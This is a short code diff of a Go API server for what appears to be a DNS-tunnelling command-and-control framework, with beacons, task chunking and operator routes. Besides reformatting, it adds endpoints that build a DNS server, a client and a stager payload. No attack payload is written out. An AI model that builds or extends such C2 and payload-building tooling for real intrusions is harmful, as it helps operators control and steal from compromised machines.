@@ -107,13 +107,13 @@ type ResultSubmitRequest struct {
 }
 
 type TaskProgressRequest struct {
-	DNSServerID   string `json:"dns_server_id"`
-	APIKey        string `json:"api_key"`
-	TaskID        string `json:"task_id"`
-	BeaconID      string `json:"beacon_id"`
-	ReceivedChunks int   `json:"received_chunks"`
-	TotalChunks    int   `json:"total_chunks"`
-	Status        string `json:"status"` // "receiving", "assembling", "complete"
+	DNSServerID    string `json:"dns_server_id"`
+	APIKey         string `json:"api_key"`
+	TaskID         string `json:"task_id"`
+	BeaconID       string `json:"beacon_id"`
+	ReceivedChunks int    `json:"received_chunks"`
+	TotalChunks    int    `json:"total_chunks"`
+	Status         string `json:"status"` // "receiving", "assembling", "complete"
 }
 
 // Middleware
@@ -643,7 +643,7 @@ func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.
 		for i, task := range tasks {
 			taskIDs[i] = task["id"].(string)
 		}
-		
+
 		if err := api.db.MarkTasksSent(taskIDs); err != nil && api.config.Debug {
 			fmt.Printf("[API] Warning: Failed to mark tasks as sent: %v\n", err)
 		}
@@ -795,6 +795,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
 	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
 	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
+	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
 
 	// Serve static files (CSS, JS, images)
 	router.PathPrefix("/web/static/").Handler(
@@ -818,6 +819,11 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
 	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
 	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
+
+	// Builder endpoints
+	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
+	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")
 
 	// DNS server endpoints (API key auth required)
 	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
